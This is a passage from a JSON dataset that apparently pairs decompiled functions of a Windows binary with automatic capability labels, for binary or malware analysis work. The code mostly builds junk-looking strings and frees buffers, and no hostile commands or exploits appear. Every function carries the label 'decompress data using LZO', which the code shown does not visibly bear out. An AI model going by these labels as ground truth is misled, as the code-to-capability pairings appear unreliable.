\"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\";\n    auStack124[0] = 0x3e;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x3e, uStack84, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x3e, uStack36, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n    if (uStack64 < 0x10) {\ncode_r0x004465d0:\n        if (0xf < uStack40) {\n            in_stack_ffffff64 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff64) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x004467b1;\n                in_stack_ffffff64 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 7;\n        fcn.00402f72(0x3e, in_stack_ffffff64 & 0xffffff00 | uStack84 & 0xff, \n                     \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x3e, uStack36, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x004467bd;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x004467c9;\n            fcn.00401a32(iVar3);\n        }\n        *puStack88 = 0;\n        puStack88[5] = 0xf;\n        puStack88[4] = 0;\n        *puStack88 = 0;\n        if (0xf < uStack92) {\n            iVar3 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar3 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar3))\n            goto code_r0x004467d5;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000002c) {\n            iVar3 = in_stack_00000018;\n            if ((0xfff < in_stack_0000002c + 1) &&\n               (iVar3 = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - iVar3)) goto code_r0x004467e1;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff64 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff64 < 0x1000) {\ncode_r0x004465c4:\n        fcn.00401a32(uVar2);\n        goto code_r0x004465d0;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff64 = uStack64 + 0x24;\n        goto code_r0x004465c4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004467b1:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004467bd:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004467c9:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004467d5:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004467e1:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1670
    },
    "00404f1b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404f1b(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x414a70;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 5;\n    pcStack112 = \"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\";\n    auStack120[0] = 0x3e;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x3e, iStack84, \"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x3e, uStack36, \"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\");\n    if (uStack64 < 0x10) {\ncode_r0x004133ad:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004134c4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004134d0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x004134dc;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar2 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar2 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar2)) goto code_r0x004134e8;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004133ad;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004134c4:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004134d0:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004134dc:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004134e8:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1167
    },
    "0040503d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040503d(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t in_stack_0000005c;\n    uint32_t in_stack_00000070;\n    int32_t in_stack_00000074;\n    uint32_t in_stack_00000088;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c6a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x4d);\n    if (uStack40 < 0x10) {\ncode_r0x00433e76:\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00434006;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x00434012;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x0043401e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000070) {\n            iVar2 = in_stack_0000005c;\n            if ((0xfff < in_stack_00000070 + 1) &&\n               (iVar2 = *(in_stack_0000005c + -4),  0x1f < (in_stack_0000005c + -4) - iVar2)) goto code_r0x0043402a;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000088) {\n            iVar2 = in_stack_00000074;\n            if ((0xfff < in_stack_00000088 + 1) &&\n               (iVar2 = *(in_stack_00000074 + -4),  0x1f < (in_stack_00000074 + -4) - iVar2)) goto code_r0x00434036;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x44c8;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00433e76;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00434006:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00434012:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043401e:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043402a:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00434036:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1193
    },
    "004051b4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004051b4(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000024;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000044;\n    int32_t in_stack_00000058;\n    uint32_t in_stack_0000006c;\n    int32_t aiStack136 [4];\n    uint uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack136;\n    uStack24 = 0x44c590;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack68 = 0xf;\n    uStack72 = 0xb;\n    iStack88 = 0x69736770;\n    uStack84 = 0x6b646c69;\n    uStack80 = 0x716f69;\n    uStack120 = 0;\n    uStack116 = 0xf;\n    aiStack136[0] = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x39);\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x39, iStack112, \"xmcfxgjmjjmmpujaegpbclayjpdgwddjrqjjfacpbltyomklnmodgtmmq\");\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x39, uStack36, \"xmcfxgjmjjmmpujaegpbclayjpdgwddjrqjjfacpbltyomklnmodgtmmq\");\n    if (uStack92 < 0x10) {\ncode_r0x00430bfe:\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x00430dbc;\n            fcn.00401a32(iVar2);\n        }\n        *puStack40 = 0;\n        puStack40[5] = 0xf;\n        puStack40[4] = 2;\n        *puStack40 = 0x6469;\n        *(puStack40 + 2) = 0;\n        if (0xf < uStack116) {\n            iVar2 = aiStack136[0];\n            if ((0xfff < uStack116 + 1) && (iVar2 = *(aiStack136[0] + -4),  0x1f < (aiStack136[0] + -4) - iVar2))\n            goto code_r0x00430dc8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack68) {\n            iVar2 = iStack88;\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(iStack88 + -4),  0x1f < (iStack88 + -4) - iVar2))\n            goto code_r0x00430dd4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar2 = param_4;\n            if ((0xfff < in_stack_00000024 + 1) && (iVar2 = *(param_4 + -4),  0x1f < (param_4 + -4) - iVar2))\n            goto code_r0x00430de0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000044) {\n            iVar2 = in_stack_00000030;\n            if ((0xfff < in_stack_00000044 + 1) &&\n               (iVar2 = *(in_stack_00000030 + -4),  0x1f < (in_stack_00000030 + -4) - iVar2)) goto code_r0x00430dec;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000006c) {\n            iVar2 = in_stack_00000058;\n            if ((0xfff < in_stack_0000006c + 1) &&\n               (iVar2 = *(in_stack_00000058 + -4),  0x1f < (in_stack_00000058 + -4) - iVar2)) goto code_r0x00430df8;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack112;\n    if ((uStack92 + 1 < 0x1000) || (iVar2 = *(iStack112 + -4),  (iStack112 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00430bfe;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00430dbc:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00430dc8:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00430dd4:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00430de0:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00430dec:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00430df8:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1601
    },
    "004051d2": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004051d2(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c180;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"osauxhjqerptwkatvnsrxsp\";\n    auStack120[0] = 0x17;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x17, iStack84, \"osauxhjqerptwkatvnsrxsp\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x17, uStack36, \"osauxhjqerptwkatvnsrxsp\");\n    if (uStack64 < 0x10) {\ncode_r0x00423443:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x004234ce;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x004234da;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00423443;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004234ce:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004234da:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 789
    },
    "0040527c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0040527c(uint param_1, uint32_t param_2)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    float10 fVar3;\n    uint in_stack_00000018;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_00000038;\n    uint in_stack_00000048;\n    uint32_t in_stack_0000004c;\n    uchar *in_stack_00000054;\n    uint32_t in_stack_00000068;\n    uint uStack348;\n    uchar uStack344;\n    char *pcStack340;\n    int32_t iStack336;\n    uint uStack320;\n    uint32_t uStack316;\n    int32_t iStack312;\n    uint uStack296;\n    uint32_t uStack292;\n    int32_t iStack288;\n    uint uStack272;\n    uint32_t uStack268;\n    int32_t iStack264;\n    uint uStack248;\n    uint32_t uStack244;\n    int32_t iStack240;\n    uint uStack224;\n    uint32_t uStack220;\n    uchar uStack216;\n    uint *puStack212;\n    int32_t *piStack208;\n    uint uStack204;\n    uint uStack200;\n    int32_t iStack196;\n    uint32_t uStack192;\n    int32_t iStack176;\n    uint uStack152;\n    uchar uStack148;\n    char *pcStack144;\n    int32_t iStack140;\n    int32_t iStack136;\n    uint uStack124;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint *puStack112;\n    int32_t *piStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack96 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c750;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x00435518:\n        ppuStack32 = ppuVar1;\n        in_stack_00000018 = 0;\n        in_stack_0000001c = 0xf;\n        param_2 = param_2 & 0xffffff00;\n        if (0xf < in_stack_00000034) {\n            uStack192 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (uStack192 = *(in_stack_00000020 - 4),  unaff_EDI = uStack192, \n               0x1f < (in_stack_00000020 - 4) - uStack192)) goto code_r0x00435611;\n            in_ST0 = fcn.00401a32(uStack192);\n        }\n        in_stack_00000030 = 0;\n        in_stack_00000034 = 0xf;\n        in_stack_00000020 = in_stack_00000020 & 0xffffff00;\n        if (0xf < in_stack_0000004c) {\n            uStack192 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (uStack192 = *(in_stack_00000038 - 4),  unaff_EDI = uStack192, \n               0x1f < (in_stack_00000038 - 4) - uStack192)) goto code_r0x0043561d;\n            in_ST0 = fcn.00401a32(uStack192);\n        }\n        in_stack_00000048 = 0;\n        in_stack_0000004c = 0xf;\n        in_stack_00000038 = in_stack_00000038 & 0xffffff00;\n        if (in_stack_00000068 < 0x10) {\ncode_r0x004355f2:\n            *in_FS_OFFSET = piStack28;\n            return in_ST0;\n        }\n        puStack96 = in_stack_00000054;\n        if ((in_stack_00000068 + 1 < 0x1000) ||\n           (puStack96 = *(in_stack_00000054 + -4),  uStack192 = unaff_EDI,  in_stack_00000054 + (-4 - puStack96) < 0x20)\n           ) {\n            in_ST0 = fcn.00401a32(puStack96);\n            goto code_r0x004355f2;\n        }\n    }\n    else {\n        uStack192 = param_2;\n        if ((in_stack_0000001c + 1 < 0x1000) ||\n           (uStack192 = *(param_2 - 4),  unaff_EDI = uStack192,  (param_2 - 4) - uStack192 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            in_ST0 = fcn.00401a32(uStack192);\n            ppuVar1 = ppuStack32;\n            goto code_r0x00435518;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00435611:\n        uStack20 = 1;\n        fcn.004047f5();\ncode_r0x0043561d:\n        uStack20 = 2;\n        fcn.004047f5();\n    }\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack112 = &uStack152;\n    uStack100 = 0xffffffff;\n    uStack104 = 0x44c760;\n    piStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack108;\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack148 = uStack116;\n    pcStack144 = \"fsdhpxgfricsrcbjenclzsgymuhodpvglephqdozjdaguchouejecsntpyuvyagjaiicemqukesd\";\n    uStack152 = 0x4c;\n    uStack92 = uStack192;\n    fVar3 = fcn.00402f72();\n    if (uStack120 < 0x10) {\ncode_r0x0043571d:\n        *in_FS_OFFSET = piStack108;\n        return fVar3;\n    }\n    iStack196 = iStack140;\n    if ((uStack120 + 1 < 0x1000) || (iStack196 = *(iStack140 + -4),  (iStack140 + -4) - iStack196 < 0x20)) {\n        fVar3 = fcn.00401a32(iStack196);\n        goto code_r0x0043571d;\n    }\n    uStack100 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack212 = &uStack348;\n    uStack204 = 0x44c770;\n    piStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack208;\n    uStack320 = 0;\n    uStack316 = 0xf;\n    iStack336 = 0;\n    uStack200 = 7;\n    uStack344 = iStack288;\n    pcStack340 = \"twugqnwrdvsnxlboujmtirmogebybw\";\n    uStack348 = 0x1e;\n    fcn.00402f72();\n    uStack272 = 0;\n    uStack268 = 0xf;\n    iStack288 = 0;\n    uStack200 = 8;\n    fcn.00402f72(0x26, iStack264, \"qklgdlodktfqtysomqdskxmbdagvlcdehgowtj\");\n    uStack248 = 0;\n    uStack244 = 0xf;\n    iStack264 = 0;\n    uStack200 = 9;\n    fcn.00402f72(0x50, iStack240, \"qhhyykgxsqblbvuffhoehedfsdjkdrdxhvymhhogwtvvovtzpkuwnankdegatzjehrbmporwzjgeagjx\");\n    uStack224 = 0;\n    uStack220 = 0xf;\n    iStack240 = 0;\n    uStack200 = 10;\n    fcn.00402f72(0x1e, iStack312, \"twugqnwrdvsnxlboujmtirmogebybw\");\n    uStack296 = 0;\n    uStack292 = 0xf;\n    iStack312 = 0;\n    uStack200 = 0xb;\n    fcn.00402f72(0x1e, uStack216, \"twugqnwrdvsnxlboujmtirmogebybw\");\n    if (uStack292 < 0x10) {\ncode_r0x00435911:\n        if (0xf < uStack220) {\n            iVar2 = iStack240;\n            if ((0xfff < uStack220 + 1) && (iVar2 = *(iStack240 + -4),  0x1f < (iStack240 + -4) - iVar2))\n            goto code_r0x00435aa9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack244) {\n            iVar2 = iStack264;\n            if ((0xfff < uStack244 + 1) && (iVar2 = *(iStack264 + -4),  0x1f < (iStack264 + -4) - iVar2))\n            goto code_r0x00435ab5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack268) {\n            iVar2 = iStack288;\n            if ((0xfff < uStack268 + 1) && (iVar2 = *(iStack288 + -4),  0x1f < (iStack288 + -4) - iVar2))\n            goto code_r0x00435ac1;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack316) {\n            iVar2 = iStack336;\n            if ((0xfff < uStack316 + 1) && (iVar2 = *(iStack336 + -4),  0x1f < (iStack336 + -4) - iVar2))\n            goto code_r0x00435acd;\n            fcn.00401a32(iVar2);\n        }\n        if ((iStack176 + -4) - *(iStack176 + -4) < 0x20) {\n            fcn.00401a32(*(iStack176 + -4));\n            if (uStack116 < 0x10) {\ncode_r0x00435a81:\n                *in_FS_OFFSET = piStack208;\n                return *0x542438;\n            }\n            iVar2 = iStack136;\n            if ((uStack116 + 1 < 0x1000) || (iVar2 = *(iStack136 + -4),  (iStack136 + -4) - iVar2 < 0x20)) {\n                fcn.00401a32(iVar2);\n                goto code_r0x00435a81;\n            }\n            goto code_r0x00435ae5;\n        }\n    }\n    else {\n        iVar2 = iStack312;\n        if ((uStack292 + 1 < 0x1000) || (iVar2 = *(iStack312 + -4),  (iStack312 + -4) - iVar2 < 0x20)) {\n            fcn.00401a32(iVar2);\n            goto code_r0x00435911;\n        }\n        uStack200 = 0;\n        fcn.004047f5();\ncode_r0x00435aa9:\n        uStack200 = 1;\n        fcn.004047f5();\ncode_r0x00435ab5:\n        uStack200 = 2;\n        fcn.004047f5();\ncode_r0x00435ac1:\n        uStack200 = 3;\n        fcn.004047f5();\ncode_r0x00435acd:\n        uStack200 = 4;\n        fcn.004047f5();\n    }\n    uStack200 = 5;\n    fcn.004047f5();\ncode_r0x00435ae5:\n    uStack200 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2989
    },
    "004052a9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
